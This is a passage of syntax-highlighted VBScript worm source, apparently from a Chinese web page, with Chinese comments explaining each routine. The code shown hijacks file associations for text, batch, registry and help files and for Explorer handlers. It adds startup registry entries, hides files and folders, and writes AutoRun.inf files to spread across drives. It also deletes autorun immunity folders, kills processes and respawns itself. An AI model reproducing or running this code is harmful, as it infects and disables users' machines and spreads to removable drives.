CreateFile(VirusCode,VirusAssPath)</span><br><span class="line">            <span class="keyword">Call</span> CreateFile(VirusCode,VirusLoadPath) <span class="comment">'//这一步创建了流文件</span></span><br><span class="line">            <span class="keyword">Call</span> CopyFile(HostSourcePath,HostFilePath) <span class="comment">'//这一步将wscript.exe从system32复制到system目录并改名svchost.exe</span></span><br><span class="line">            <span class="keyword">Call</span> SetHiddenAttr(HostFilePath)</span><br><span class="line">        <span class="keyword">Else</span> <span class="comment">'//FAT32格式</span></span><br><span class="line">            <span class="keyword">Call</span> CreateFile(VirusCode, VirusAssPath)</span><br><span class="line">            <span class="keyword">Call</span> SetHiddenAttr(VirusAssPath)</span><br><span class="line">            <span class="keyword">Call</span> CreateFile(VirusCode,VirusLoadPath)</span><br><span class="line">            <span class="keyword">Call</span> SetHiddenAttr(VirusLoadPath)</span><br><span class="line">            <span class="keyword">Call</span> CopyFile(HostSourcePath, HostFilePath)</span><br><span class="line">            <span class="keyword">Call</span> SetHiddenAttr(HostFilePath)</span><br><span class="line">        <span class="keyword">End</span> <span class="keyword">If</span></span><br><span class="line">    <span class="keyword">End</span> <span class="keyword">If</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">If</span> ReadReg(HCULoad)&lt;&gt;Load_Value  <span class="keyword">Then</span>  <span class="comment">'//改写注册表启动项，smss.exe的流</span></span><br><span class="line">        <span class="keyword">Call</span> WriteReg (HCULoad, Load_Value, <span class="string">""</span>)</span><br><span class="line">    <span class="keyword">End</span> <span class="keyword">If</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">If</span> GetVersion() &lt; Version <span class="keyword">Then</span>   <span class="comment">'//改写版本信息为1</span></span><br><span class="line">        <span class="keyword">Call</span> WriteReg (HCUVer, Version, <span class="string">""</span>)</span><br><span class="line">    <span class="keyword">End</span> <span class="keyword">If</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">If</span> GetInfectedDate() = <span class="string">""</span> <span class="keyword">Then</span></span><br><span class="line">        <span class="keyword">Call</span> WriteReg (HCUDate, <span class="built_in">Date</span>, <span class="string">""</span>)  <span class="comment">'//记录感染时间</span></span><br><span class="line">    <span class="keyword">End</span> <span class="keyword">If</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">'//以下更改许多文件关联,病毒的通用感染方式</span></span><br><span class="line">    <span class="keyword">If</span> ReadReg(<span class="string">"HKEY_LOCAL_MACHINE/SOFTWARE/Classes/txtfile/shell/open/command/"</span>)&lt;&gt;File_Value <span class="keyword">Then</span></span><br><span class="line">        <span class="keyword">Call</span> SetTxtFileAss(VirusAssPath)</span><br><span class="line">    <span class="keyword">End</span> <span class="keyword">If</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">If</span> ReadReg(<span class="string">"HKEY_LOCAL_MACHINE/SOFTWARE/Classes/inifile/shell/open/command/"</span>)&lt;&gt;File_Value <span class="keyword">Then</span></span><br><span class="line">        <span class="keyword">Call</span> SetIniFileAss(VirusAssPath)</span><br><span class="line">    <span class="keyword">End</span> <span class="keyword">If</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">If</span> ReadReg(<span class="string">"HKEY_LOCAL_MACHINE/SOFTWARE/Classes/inffile/shell/open/command/"</span>)&lt;&gt;File_Value <span class="keyword">Then</span></span><br><span class="line">        <span class="keyword">Call</span> SetInfFileAss(VirusAssPath)</span><br><span class="line">    <span class="keyword">End</span> <span class="keyword">If</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">If</span> ReadReg(<span class="string">"HKEY_LOCAL_MACHINE/SOFTWARE/Classes/batfile/shell/open/command/"</span>)&lt;&gt;File_Value <span class="keyword">Then</span></span><br><span class="line">        <span class="keyword">Call</span> SetBatFileAss(VirusAssPath)</span><br><span class="line">    <span class="keyword">End</span> <span class="keyword">If</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">If</span> ReadReg(<span class="string">"HKEY_LOCAL_MACHINE/SOFTWARE/Classes/cmdfile/shell/open/command/"</span>)&lt;&gt;File_Value <span class="keyword">Then</span></span><br><span class="line">        <span class="keyword">Call</span> SetCmdFileAss(VirusAssPath)</span><br><span class="line">    <span class="keyword">End</span> <span class="keyword">If</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">If</span> ReadReg(<span class="string">"HKEY_LOCAL_MACHINE/SOFTWARE/Classes/regfile/shell/open/command/"</span>)&lt;&gt;File_Value <span class="keyword">Then</span></span><br><span class="line">        <span class="keyword">Call</span> SetRegFileAss(VirusAssPath)</span><br><span class="line">    <span class="keyword">End</span> <span class="keyword">If</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">If</span> ReadReg(<span class="string">"HKEY_LOCAL_MACHINE/SOFTWARE/Classes/chm.file/shell/open/command/"</span>)&lt;&gt;File_Value <span class="keyword">Then</span></span><br><span class="line">        <span class="keyword">Call</span> SetchmFileAss(VirusAssPath)</span><br><span class="line">    <span class="keyword">End</span> <span class="keyword">If</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">If</span> ReadReg(<span class="string">"HKEY_LOCAL_MACHINE/SOFTWARE/Classes/hlpfile/shell/open/command/"</span>)&lt;&gt;File_Value <span class="keyword">Then</span></span><br><span class="line">        <span class="keyword">Call</span> SethlpFileAss(VirusAssPath)</span><br><span class="line">    <span class="keyword">End</span> <span class="keyword">If</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">If</span> ReadReg(<span class="string">"HKEY_LOCAL_MACHINE/SOFTWARE/Classes/Applications/iexplore.exe/shell/open/command/"</span>)&lt;&gt;IE_Value <span class="keyword">Then</span></span><br><span class="line">        <span class="keyword">Call</span> SetIEAss(VirusAssPath)</span><br><span class="line">    <span class="keyword">End</span> <span class="keyword">If</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">If</span> ReadReg(<span class="string">"HKEY_CLASSES_ROOT/CLSID/&#123;871C5380-42A0-1069-A2EA-08002B30309D&#125;/shell/OpenHomePage/Command/"</span>)&lt;&gt;IE_Value <span class="keyword">Then</span></span><br><span class="line">        <span class="keyword">Call</span> SetIEAss(VirusAssPath)</span><br><span class="line">    <span class="keyword">End</span> <span class="keyword">If</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">If</span> ReadReg(<span class="string">"HKEY_CLASSES_ROOT/CLSID/&#123;20D04FE0-3AEA-1069-A2D8-08002B30309D&#125;/shell/open/command/"</span>)&lt;&gt;MyCpt_Value1 <span class="keyword">Then</span></span><br><span class="line">        <span class="keyword">Call</span> SetMyComputerAss(VirusAssPath)</span><br><span class="line">    <span class="keyword">End</span> <span class="keyword">If</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">If</span> ReadReg(<span class="string">"HKEY_CLASSES_ROOT/CLSID/&#123;20D04FE0-3AEA-1069-A2D8-08002B30309D&#125;/shell/explore/command/"</span>)&lt;&gt;MyCpt_Value2 <span class="keyword">Then</span></span><br><span class="line">        <span class="keyword">Call</span> SetMyComputerAss(VirusAssPath)</span><br><span class="line">    <span class="keyword">End</span> <span class="keyword">If</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">Call</span> RegSet()</span><br><span class="line"><span class="keyword">End</span> <span class="keyword">Sub</span></span><br><span class="line"></span><br><span class="line"><span class="comment">'//拷贝文件</span></span><br><span class="line"><span class="keyword">Sub</span> CopyFile(source, pathf)</span><br><span class="line">    <span class="keyword">On</span> <span class="keyword">Error</span> <span class="keyword">Resume</span> <span class="keyword">Next</span></span><br><span class="line">    <span class="keyword">If</span> FSO.FileExists(pathf) <span class="keyword">Then</span></span><br><span class="line">        FSO.DeleteFile pathf , <span class="literal">True</span></span><br><span class="line">    <span class="keyword">End</span> <span class="keyword">If</span>    </span><br><span class="line">    FSO.CopyFile source, pathf</span><br><span class="line"><span class="keyword">End</span> <span class="keyword">Sub</span></span><br><span class="line"></span><br><span class="line"><span class="comment">'//创建文件</span></span><br><span class="line"><span class="keyword">Sub</span> CreateFile(code, pathf)</span><br><span class="line">    <span class="keyword">On</span> <span class="keyword">Error</span> <span class="keyword">Resume</span> <span class="keyword">Next</span></span><br><span class="line">    <span class="keyword">Dim</span> FileText</span><br><span class="line">    <span class="keyword">If</span> FSO.FileExists(pathf) <span class="keyword">Then</span></span><br><span class="line">        <span class="keyword">Set</span> FileText=FSO.OpenTextFile(pathf, <span class="number">2</span>, <span class="literal">False</span>)</span><br><span class="line">        FileText.Write code</span><br><span class="line">        FileText.Close</span><br><span class="line">    <span class="keyword">Else</span></span><br><span class="line">        <span class="keyword">Set</span> FileText=FSO.OpenTextFile(pathf, <span class="number">2</span>, <span class="literal">True</span>)</span><br><span class="line">        FileText.Write code</span><br><span class="line">        FileText.Close</span><br><span class="line">    <span class="keyword">End</span> <span class="keyword">If</span></span><br><span class="line"><span class="keyword">End</span> <span class="keyword">Sub</span></span><br><span class="line"></span><br><span class="line"><span class="comment">'//注册表设置</span></span><br><span class="line"><span class="keyword">Sub</span> RegSet()</span><br><span class="line">    <span class="keyword">On</span> <span class="keyword">Error</span> <span class="keyword">Resume</span> <span class="keyword">Next</span> </span><br><span class="line">    <span class="keyword">Dim</span> RegPath1 , RegPath2, RegPath3, RegPath4</span><br><span class="line">    RegPath1=<span class="string">"HKEY_LOCAL_MACHINE/SOFTWARE/Microsoft/Windows/CurrentVersion/Explorer/Advanced/Folder/Hidden/NOHIDDEN/CheckedValue"</span></span><br><span class="line">    RegPath2=<span class="string">"HKEY_LOCAL_MACHINE/SOFTWARE/Microsoft/Windows/CurrentVersion/Explorer/Advanced/Folder/Hidden/SHOWALL/CheckedValue"</span></span><br><span class="line">    RegPath3=<span class="string">"HKEY_CURRENT_USER/Software/Microsoft/Windows/CurrentVersion/Policies/Explorer/NoDriveTypeAutoRun"</span></span><br><span class="line">    RegPath4=<span class="string">"HKEY_CLASSES_ROOT/lnkfile/IsShortcut"</span></span><br><span class="line">    <span class="keyword">Call</span> WriteReg (RegPath1, <span class="number">3</span>, <span class="string">"REG_DWORD"</span>)</span><br><span class="line">    <span class="keyword">Call</span> WriteReg (RegPath2, <span class="number">2</span>, <span class="string">"REG_DWORD"</span>)</span><br><span class="line">    <span class="keyword">Call</span> WriteReg (RegPath3, <span class="number">0</span>, <span class="string">"REG_DWORD"</span>)</span><br><span class="line">    <span class="keyword">Call</span> DeleteReg (RegPath4)</span><br><span class="line"><span class="keyword">End</span> <span class="keyword">Sub</span></span><br><span class="line"></span><br><span class="line"><span class="comment">'//结束进程</span></span><br><span class="line"><span class="keyword">Sub</span> KillProcess(ProcessNames)</span><br><span class="line">    <span class="keyword">On</span> <span class="keyword">Error</span> <span class="keyword">Resume</span> <span class="keyword">Next</span></span><br><span class="line">    <span class="keyword">Set</span> WMIService=<span class="built_in">GetObject</span>(<span class="string">"winmgmts://./root/cimv2"</span>)</span><br><span class="line">    <span class="keyword">For</span> <span class="keyword">Each</span> ProcessName <span class="keyword">in</span> ProcessNames </span><br><span class="line">        <span class="keyword">Set</span> ProcessList=WMIService.execquery(<span class="string">" Select * From win32_process where name ='"</span>&amp;ProcessName&amp;<span class="string">"' "</span>)</span><br><span class="line">        <span class="keyword">For</span> <span class="keyword">Each</span> Process <span class="keyword">in</span> ProcessList</span><br><span class="line">            IntReturn=Process.terminate</span><br><span class="line">            <span class="keyword">If</span> intReturn&lt;&gt;<span class="number">0</span> <span class="keyword">Then</span></span><br><span class="line">                WshShell.Run <span class="string">"CMD /c ntsd -c q -p "</span>&amp;Process.Handle, vbHide, <span class="literal">False</span></span><br><span class="line">            <span class="keyword">End</span> <span class="keyword">If</span></span><br><span class="line">        <span class="keyword">Next</span></span><br><span class="line">    <span class="keyword">Next</span></span><br><span class="line"><span class="keyword">End</span> <span class="keyword">Sub</span></span><br><span class="line"></span><br><span class="line"><span class="comment">'//删掉autorun.inf免疫目录</span></span><br><span class="line"><span class="keyword">Sub</span> KillImmunity(D)</span><br><span class="line">    <span class="keyword">On</span> <span class="keyword">Error</span> <span class="keyword">Resume</span> <span class="keyword">Next</span></span><br><span class="line">    ImmunityFolder=D&amp;<span class="string">":/Autorun.inf"</span></span><br><span class="line">    <span class="keyword">If</span> Fso.FolderExists(ImmunityFolder) <span class="keyword">Then</span></span><br><span class="line">        WshSHell.Run (<span class="string">"CMD /C CACLS "</span>&amp; <span class="string">""""</span>&amp;ImmunityFolder&amp;<span class="string">""""</span> &amp;<span class="string">" /t /e /c /g everyone:f"</span>),vbHide,<span class="literal">True</span>   <span class="comment">'//提权</span></span><br><span class="line">        WshSHell.Run (<span class="string">"CMD /C RD /S /Q "</span>&amp; ImmunityFolder), vbHide, <span class="literal">True</span>   <span class="comment">'//rd命令删除，配合 /s /q 选项，很轻松</span></span><br><span class="line">    <span class="keyword">End</span> <span class="keyword">If</span></span><br><span class="line"><span class="keyword">End</span> <span class="keyword">Sub</span></span><br><span class="line"></span><br><span class="line"><span class="comment">'//保护病毒进程 保持脚本进程持续运行，少于2个创建新进程</span></span><br><span class="line"><span class="keyword">Sub</span> KeepProcess(VBSFullNames)</span><br><span class="line">    <span class="keyword">On</span> <span class="keyword">Error</span> <span class="keyword">Resume</span> <span class="keyword">Next</span></span><br><span class="line">    <span class="keyword">For</span> <span class="keyword">Each</span> VBSFullName <span class="keyword">in</span> VBSFullNames </span><br><span class="line">        <span class="keyword">If</span> VBSProcessCount(VBSFullName) &lt; <span class="number">2</span> <span class="keyword">then</span></span><br><span class="line">            Run(<span class="string">"%SystemRoot%/system/svchost.exe "</span>&amp;VBSFullName)</span><br><span class="line">        <span class="keyword">End</span> <span class="keyword">If</span></span><br><span class="line">    <span class="keyword">Next</span></span><br><span class="line"><span class="keyword">End</span> <span class="keyword">Sub</span></span><br><span class="line"></span><br><span class="line"><span class="comment">'//获得系统分区 c:</span></span><br><span class="line"><span class="comment">'//FileSystemObject.GetSpecialFolder 返回指定特殊文件夹</span></span><br><span class="line"><span class="comment">'//WindowsFolder   0   Windows 文件夹，包含 Windows 操作系统安装的文件。 </span></span><br><span class="line"><span class="comment">'//SystemFolder    1   System 文件夹，包含库、字体和设备驱动程序文件。 </span></span><br><span class="line"><span class="comment">'//TemporaryFolder 2   Temp 文件夹，用于保存临时文件。可以在 TMP 环境变量中找到该文件夹的路径。 </span></span><br><span class="line"><span class="comment">'//Left 返回指定数目的从字符串的左边算起的字符。</span></span><br><span class="line"><span class="keyword">Function</span> GetSystemDrive()</span><br><span class="line">    GetSystemDrive=<span class="built_in">Left</span>(Fso.GetSpecialFolder(<span class="number">0</span>),<span class="number">2</span>)</span><br><span class="line"><span class="keyword">End</span> <span class="keyword">Function</span></span><br><span class="line"></span><br><span class="line"><span class="comment">'//FileSystemObject.GetDrive返回与指定的路径中驱动器相对应的 Drive 对象。Drive 提供对磁盘驱动器或网络共享的属性的访问。</span></span><br><span class="line"><span class="comment">'//Drive.FileSystem返回指定的驱动器使用的文件系统的类型。</span></span><br><span class="line"><span class="keyword">Function</span> GetFileSystemType(Drive)</span><br><span class="line">    <span class="keyword">Set</span> d=FSO.GetDrive(Drive)</span><br><span class="line">    GetFileSystemType=d.FileSystem</span><br><span class="line"><span class="keyword">End</span> <span class="keyword">Function</span></span><br><span class="line"></span><br><span class="line"><span class="comment">'//读取注册表建值 返回所在路径</span></span><br><span class="line"><span class="keyword">Function</span> ReadReg(strkey)</span><br><span class="line">    <span class="keyword">Dim</span> tmps</span><br><span class="line">    <span class="keyword">Set</span> tmps=<span class="built_in">CreateObject</span>(<span class="string">"WScript.Shell"</span>)</span><br><span class="line">    ReadReg=tmps.RegRead(strkey)</span><br><span class="line">    <span class="keyword">Set</span> tmps=<span class="literal">Nothing</span></span><br><span class="line"><span class="keyword">End</span> <span class="keyword">Function</span></span><br><span class="line"></span><br><span class="line"><span class="comment">'//重写注册表键值</span></span><br><span class="line"><span class="keyword">Sub</span> WriteReg(strkey, Value, vtype)</span><br><span class="line">    <span class="keyword">Dim</span> tmps</span><br><span class="line">    <span class="keyword">Set</span> tmps=<span class="built_in">CreateObject</span>(<span class="string">"WScript.Shell"</span>)</span><br><span class="line">    <span class="keyword">If</span> vtype=<span class="string">""</span> <span class="keyword">Then</span></span><br><span class="line">        tmps.RegWrite strkey, Value</span><br><span class="line">    <span class="keyword">Else</span></span><br><span class="line">        tmps.RegWrite strkey, Value, vtype</span><br><span class="line">    <span class="keyword">End</span> <span class="keyword">If</span></span><br><span class="line">    <span class="keyword">Set</span> tmps=<span class="literal">Nothing</span></span><br><span class="line"><span class="keyword">End</span> <span class="keyword">Sub</span></span><br><span class="line"></span><br><span class="line"><span class="comment">'//删除注册表键值</span></span><br><span class="line"><span class="keyword">Sub</span> DeleteReg(strkey)</span><br><span class="line">    <span class="keyword">Dim</span> tmps</span><br><span class="line">    <span class="keyword">Set</span> tmps=<span class="built_in">CreateObject</span>(<span class="string">"WScript.Shell"</span>)</span><br><span class="line">    tmps.RegDelete strkey</span><br><span class="line">    <span class="keyword">Set</span> tmps=<span class="literal">Nothing</span></span><br><span class="line"><span class="keyword">End</span> <span class="keyword">Sub</span></span><br><span class="line"></span><br><span class="line"><span class="comment">'//设置隐藏属性</span></span><br><span class="line"><span class="keyword">Sub</span> SetHiddenAttr(path)</span><br><span class="line">    <span class="keyword">On</span> <span class="keyword">Error</span> <span class="keyword">Resume</span> <span class="keyword">Next</span></span><br><span class="line">    <span class="keyword">Dim</span> vf</span><br><span class="line">    <span class="keyword">Set</span> vf=FSO.GetFile(path)</span><br><span class="line">    <span class="keyword">Set</span> vf=FSO.GetFolder(path)</span><br><span class="line">    vf.Attributes=<span class="number">6</span> <span class="comment">'// 6=2+4 分别是隐藏、系统属性</span></span><br><span class="line"><span class="keyword">End</span> <span class="keyword">Sub</span></span><br><span class="line"></span><br><span class="line"><span class="comment">'//执行ExeFullName指定的文件</span></span><br><span class="line"><span class="keyword">Sub</span> Run(ExeFullName)</span><br><span class="line">    <span class="keyword">On</span> <span class="keyword">Error</span> <span class="keyword">Resume</span> <span class="keyword">Next</span></span><br><span class="line">    <span class="keyword">Dim</span> WshShell</span><br><span class="line">    <span class="keyword">Set</span> WshShell=WScript.<span class="built_in">CreateObject</span>(<span class="string">"WScript.Shell"</span>)</span><br><span class="line">    WshShell.Run ExeFullName</span><br><span class="line">    <span class="keyword">Set</span> WshShell=<span class="literal">Nothing</span></span><br><span class="line"><span class="keyword">End</span> <span class="keyword">Sub</span></span><br><span class="line"></span><br><span class="line"><span class="comment">'//感染根目录</span></span><br><span class="line"><span class="keyword">Sub</span> InfectRoot(D,VirusName)</span><br><span class="line">    <span class="keyword">On</span> <span class="keyword">Error</span> <span class="keyword">Resume</span> <span class="keyword">Next</span></span><br><span class="line">    <span class="keyword">Dim</span> VBSCode</span><br><span class="line">    VBSCode=GetCode(WScript.ScriptFullName)</span><br><span class="line">    VBSPath=D&amp;<span class="string">":/"</span>&amp;VirusName</span><br><span class="line">    <span class="keyword">If</span> FSO.FileExists(VBSPath)=<span class="literal">False</span> <span class="keyword">Then</span></span><br><span class="line">        <span class="keyword">Call</span> CreateFile(VBSCode, VBSPath)</span><br><span class="line">        <span class="keyword">Call</span> SetHiddenAttr(VBSPath)</span><br><span class="line">    <span class="keyword">End</span> <span class="keyword">If</span></span><br><span class="line">    <span class="keyword">Set</span> Folder=Fso.GetFolder(D&amp;<span class="string">":/"</span>)  <span class="comment">'//隐藏根目录下的所有子目录</span></span><br><span class="line">    <span class="keyword">Set</span> SubFolders=Folder.Subfolders</span><br><span class="line">    <span class="keyword">For</span> <span class="keyword">Each</span> SubFolder <span class="keyword">In</span> SubFolders</span><br><span class="line">        SetHiddenAttr(SubFolder.Path)</span><br><span class="line">        LnkPath=D&amp;<span class="string">":/"</span>&amp;SubFolder.Name&amp;<span class="string">".lnk"</span>  <span class="comment">'//创建对应的快捷方式</span></span><br><span class="line">        TargetPath=D&amp;<span class="string">":/"</span>&amp;VirusName</span><br><span class="line">        Args=<span class="string">""""</span>&amp;D&amp;<span class="string">":/"</span>&amp;SubFolder.Name&amp; <span class="string">"/Dir"""</span></span><br><span class="line">        <span class="keyword">If</span> Fso.FileExists(LnkPath)=<span class="literal">False</span> <span class="keyword">Or</span> GetTargetPath(LnkPath) &lt;&gt; TargetPath <span class="keyword">Then</span></span><br><span class="line">            <span class="keyword">If</span> Fso.FileExists(LnkPath)=<span class="literal">True</span> <span class="keyword">Then</span></span><br><span class="line">                FSO.DeleteFile LnkPath, <span class="literal">True</span></span><br><span class="line">            <span class="keyword">End</span> <span class="keyword">If</span></span><br><span class="line">            <span class="keyword">Call</span> CreateShortcut(LnkPath,TargetPath,Args)</span><br><span class="line">        <span class="keyword">End</span> <span class="keyword">If</span></span><br><span class="line">    <span class="keyword">Next</span></span><br><span class="line"><span class="keyword">End</span> <span class="keyword">Sub</span></span><br><span class="line"></span><br><span class="line"><span class="comment">'//上一步失败了调用这个函数创建快捷方式</span></span><br><span class="line"><span class="keyword">Sub</span> CreateShortcut(LnkPath,TargetPath,Args)</span><br><span class="line">    <span class="keyword">Set</span> Shortcut=WshShell.CreateShortcut(LnkPath)</span><br><span class="line">    <span class="keyword">with</span> Shortcut</span><br><span class="line">        .TargetPath=TargetPath</span><br><span class="line">        .Arguments=Args</span><br><span class="line">        .WindowStyle=<span class="number">4</span></span><br><span class="line">        .IconLocation=<span class="string">"%SystemRoot%/System32/Shell32.dll, 3"</span></span><br><span class="line">        .Save</span><br><span class="line">    <span class="keyword">end</span> <span class="keyword">with</span></span><br><span class="line"><span class="keyword">End</span> <span class="keyword">Sub</span></span><br><span class="line"></span><br><span class="line"><span class="comment">'//创建autorun.inf文件</span></span><br><span class="line"><span class="keyword">Sub</span> CreateAutoRun(D,VirusName)</span><br><span class="line">    <span class="keyword">On</span> <span class="keyword">Error</span> <span class="keyword">Resume</span> <span class="keyword">Next</span></span><br><span class="line">    <span class="keyword">Dim</span> InfPath, VBSPath, VBSCode</span><br><span class="line">    InfPath=D&amp;<span class="string">":/AutoRun.inf"</span></span><br><span class="line">    VBSPath=D&amp;<span class="string">":/"</span>&amp;VirusName</span><br><span class="line">    VBSCode=GetCode(WScript.ScriptFullName)</span><br><span class="line">    <span class="keyword">If</span> FSO.FileExists(InfPath)=<span class="literal">False</span> <span class="keyword">Or</span> FSO.FileExists(VBSPath)=<span class="literal">False</span> <span class="keyword">Then</span></span><br><span class="line">        <span class="keyword">Call</span> CreateFile(VBSCode, VBSPath)</span><br><span class="line">        <span class="keyword">Call</span> SetHiddenAttr(VBSPath)</span><br><span class="line">        StrInf=<span class="string">"[AutoRun]"</span>&amp;VBCRLF&amp;<span class="string">"Shellexecute=WScript.exe "</span>&amp;VirusName&amp;<span class="string">" ""AutoRun"""</span>&amp;VBCRLF&amp;<span class="string">"shell/open=打开(&amp;O)"</span>&amp;VBCRLF&amp;<span class="string">"shell/open/command=WScript.exe "</span>&amp;VirusName&amp;<span class="string">" </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">""AutoRun"""</span>&amp;VBCRLF&amp;<span class="string">"shell/open/Default=1"</span>&amp; VBCRLF&amp;<span class="string">"shell/explore=资源管理器(&amp;X)"</span>&amp;VBCRLF&amp;<span class="string">"shell/explore/command=WScript.exe "</span>&amp;VirusName&amp;<span class="string">" ""AutoRun"""</span></span><br><span class="line">        <span class="keyword">Call</span> KillImmunity(D)</span><br><span class="line">        <span class="keyword">Call</span> CreateFile(StrInf, InfPath)</span><br><span class="line">        <span class="keyword">Call</span> SetHiddenAttr(InfPath)</span><br><span class="line">    <span class="keyword">End</span> <span class="keyword">If</span></span><br><span class="line"><span class="keyword">End</span> <span class="keyword">Sub</span></span><br><span class="line"></span><br><span class="line"><span class="comment">'//改变txt格式文件关联</span></span><br><span class="line"><span class="keyword">Sub</span> SetTxtFileAss(sFilePath)</span><br><span class="line">    <span class="keyword">On</span> <span class="keyword">Error</span> <span class="keyword">Resume</span> <span class="keyword">Next</span></span><br><span class="line">    <span class="keyword">Dim</span> Value</span><br><span class="line">    Value=<span class="string">"%SystemRoot%/System32/WScript.exe "</span>&amp;<span class="string">""""</span>&amp;sFilePath&amp;<span class="string">""""</span>&amp;<span class="string">" %1 %* "</span></span><br><span class="line">    <span class="keyword">Call</span> WriteReg(<span class="string">"HKEY_LOCAL_MACHINE/SOFTWARE/Classes/txtfile/shell/open/command/"</span>, Value, <span class="string">"REG_EXPAND_SZ"</span>)</span><br><span class="line"><span class="keyword">End</span> <span class="keyword">Sub</span></span><br><span class="line"></span><br><span class="line"><span class="comment">'//改变ini格式文件关联</span></span><br><span class="line"><span class="keyword">Sub</span> SetIniFileAss(sFilePath)</span><br><span class="line">    <span class="keyword">On</span> <span class="keyword">Error</span> <span class="keyword">Resume</span> <span class="keyword">Next</span></span><br><span class="line">    <span class="keyword">Dim</span> Value</span><br><span class="line">    Value=<span class="string">"%SystemRoot%/System32/WScript.exe "</span>&amp;<span class="string">""""</span>&amp;sFilePath&amp;<span class="string">""""</span>&amp;<span class="string">" %1 %* "</span></span><br><span class="line">    <span class="keyword">Call</span> WriteReg(<span class="string">"HKEY_LOCAL_MACHINE/SOFTWARE/Classes/inifile/shell/open/command/"</span>, Value, <span class="string">"REG_EXPAND_SZ"</span>)</span><br><span class="line"><span class="keyword">End</span> <span class="keyword">Sub</span></span><br><span class="line"></span><br><span class="line"><span class="comment">'//改变inf格式文件关联</span></span><br><span class="line"><span class="keyword">Sub</span> SetInfFileAss(sFilePath)</span><br><span class="line">    <span class="keyword">On</span> <span class="keyword">Error</span> <span class="keyword">Resume</span> <span class="keyword">Next</span></span><br><span class="line">    <span class="keyword">Dim</span> Value</span><br><span class="line">    Value=<span class="string">"%SystemRoot%/System32/WScript.exe "</span>&amp;<span class="string">""""</span>&amp;sFilePath&amp;<span class="string">""""</span>&amp;<span class="string">" %1 %* "</span></span><br><span class="line">    <span class="keyword">Call</span> WriteReg(<span class="string">"HKEY_LOCAL_MACHINE/SOFTWARE/Classes/inffile/shell/open/command/"</span>, Value, <span class="string">"REG_EXPAND_SZ"</span>)</span><br><span class="line"><span class="keyword">End</span> <span class="keyword">Sub</span></span><br><span class="line"></span><br><span class="line"><span class="comment">'//改变bat格式文件关联</span></span><br><span class="line"><span class="keyword">Sub</span> SetBatFileAss(sFilePath)</span><br><span class="line">    <span class="keyword">On</span> <span class="keyword">Error</span> <span class="keyword">Resume</span> <span class="keyword">Next</span></span><br><span class="line">    <span class="keyword">Dim</span> Value</span><br><span class="line">    Value=<span class="string">"%SystemRoot%/System32/WScript.exe "</span>&amp;<span class="string">""""</span>&amp;sFilePath&amp;<span class="string">""""</span>&amp;<span class="string">" %1 %* "</span></span><br><span class="line">    <span class="keyword">Call</span> WriteReg(<span class="string">"HKEY_LOCAL_MACHINE/SOFTWARE/Classes/batfile/shell/open/command/"</span>, Value, <span class="string">"REG_EXPAND_SZ"</span>)</span><br><span class="line"><span class="keyword">End</span> <span class="keyword">Sub</span></span><br><span class="line"></span><br><span class="line"><span class="comment">'//改变cmd格式文件关联</span></span><br><span class="line"><span class="keyword">Sub</span> SetCmdFileAss(sFilePath)</span><br><span class="line">    <span class="keyword">On</span> <span class="keyword">Error</span> <span class="keyword">Resume</span> <span class="keyword">Next</span></span><br><span class="line">    <span class="keyword">Dim</span> Value</span><br><span class="line">    Value=<span class="string">"%SystemRoot%/System32/WScript.exe "</span>&amp;<span class="string">""""</span>&amp;sFilePath&amp;<span class="string">""""</span>&amp;<span class="string">" %1 %* "</span></span><br><span class="line">    <span class="keyword">Call</span> WriteReg(<span class="string">"HKEY_LOCAL_MACHINE/SOFTWARE/Classes/cmdfile/shell/open/command/"</span>, Value, <span class="string">"REG_EXPAND_SZ"</span>)</span><br><span class="line"><span class="keyword">End</span> <span class="keyword">Sub</span></span><br><span class="line"></span><br><span class="line"><span class="comment">'//改变hlp格式文件关联</span></span><br><span class="line"><span class="keyword">Sub</span> SethlpFileAss(sFilePath)</span><br><span class="line">    <span class="keyword">On</span> <span class="keyword">Error</span> <span class="keyword">Resume</span> <span class="keyword">Next</span></span><br><span class="line">    <span class="keyword">Dim</span> Value</span><br><span class="line">    Value=<span class="string">"%SystemRoot%/System32/WScript.exe "</span>&amp;<span class="string">""""</span>&amp;sFilePath&amp;<span class="string">""""</span>&amp;<span class="string">" %1 %* "</span></span><br><span class="line">    <span class="keyword">Call</span> WriteReg(<span class="string">"HKEY_LOCAL_MACHINE/SOFTWARE/Classes/hlpfile/shell/open/command/"</span>, Value, <span class="string">"REG_EXPAND_SZ"</span>)</span><br><span class="line"><span class="keyword">End</span> <span class="keyword">Sub</span></span><br><span class="line"></span><br><span class="line"><span class="comment">'//改变reg格式文件关联</span></span><br><span class="line"><span class="keyword">Sub</span> SetRegFileAss(sFilePath)</span><br><span class="line">    <span class="keyword">On</span> <span class="keyword">Error</span> <span class="keyword">Resume</span> <span class="keyword">Next</span></span><br><span class="line">    <span class="keyword">Dim</span> Value</span><br><span class="line">    Value=<span class="string">"%SystemRoot%/System32/WScript.exe "</span>&amp;<span class="string">""""</span>&amp;sFilePath&amp;<span class="string">""""</span>&amp;<span class="string">" %1 %* "</span></span><br><span class="line">    <span class="keyword">Call</span> WriteReg(<span class="string">"HKEY_LOCAL_MACHINE/SOFTWARE/Classes/regfile/shell/open/command/"</span>, Value, <span class="string">"REG_EXPAND_SZ"</span>)</span><br><span class="line"><span class="keyword">End</span> <span class="keyword">Sub</span></span><br><span class="line"></span><br><span class="line"><span class="comment">'//改变chm格式文件关联</span></span><br><span class="line"><span class="keyword">Sub</span> SetchmFileAss(sFilePath)</span><br><span class="line">    <span class="keyword">On</span> <span class="keyword">Error</span> <span class="keyword">Resume</span> <span class="keyword">Next</span></span><br><span class="line">    <span class="keyword">Dim</span> Value</span><br><span class="line">    Value=<span 